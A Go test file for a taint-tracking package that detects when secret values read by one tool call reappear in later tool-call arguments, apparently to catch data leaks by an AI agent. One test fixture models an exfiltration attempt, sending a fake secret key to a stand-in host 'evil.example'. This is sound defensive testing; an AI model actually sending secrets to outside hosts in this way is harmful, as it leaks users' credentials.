package taint

import (
	"encoding/json"
	"testing"
)

func TestMarkAndContamination(t *testing.T) {
	s := New(0, 0)
	s.Mark("read_secrets", json.RawMessage(`{"key":"sk-super-secret-value","meta":"prod"}`))

	got := s.ContaminatedBy(json.RawMessage(`{"url":"https://evil.example","body":"sending sk-super-secret-value now"}`))
	if len(got) != 1 || got[0] != "read_secrets" {
		t.Fatalf("expected contamination from read_secrets, got %v", got)
	}

	// Unrelated args: no contamination.
	if got := s.ContaminatedBy(json.RawMessage(`{"url":"https://example.com"}`)); got != nil {
		t.Fatalf("false positive: %v", got)
	}
}

func TestShortValuesIgnored(t *testing.T) {
	s := New(0, 0)
	s.Mark("read_file", json.RawMessage(`{"text":"abc"}`)) // 3 chars < minLen
	if got := s.ContaminatedBy(json.RawMessage(`{"x":"abcdef"}`)); got != nil {
		t.Fatalf("short values must not taint: %v", got)
	}
}

func TestCapsAreEnforced(t *testing.T) {
	s := New(3, 16) // tiny caps
	s.Mark("src", json.RawMessage(`["aaaa111122223333XXXX","bbbb111122223333XXXX","cccc111122223333XXXX","dddd111122223333YYYY"]`))
	s.mu.Lock()
	n := len(s.values["src"])
	s.mu.Unlock()
	if n != 3 {
		t.Fatalf("per-source cap not enforced: %d values", n)
	}
	// Oldest (aaaa) was dropped; newest (dddd) retained (truncated to 16).
	if got := s.ContaminatedBy(json.RawMessage(`{"v":"tail dddd111122223333YYYY end"}`)); len(got) != 1 {
		t.Fatalf("newest value should be retained: %v", got)
	}
	if got := s.ContaminatedBy(json.RawMessage(`{"v":"tail aaaa111122223333XXXX end"}`)); len(got) != 0 {
		t.Fatalf("oldest value should be evicted: %v", got)
	}
}

func TestMaxLenTruncates(t *testing.T) {
	s := New(0, 8)
	long := "0123456789abcdefTAIL"
	s.Mark("src", json.RawMessage(`{"v":"`+long+`"}`))
	// Contamination matches on the truncated prefix "01234567".
	if got := s.ContaminatedBy(json.RawMessage(`{"v":"zz 01234567 zz"}`)); len(got) != 1 {
		t.Fatalf("truncated value should contaminate: %v", got)
	}
}
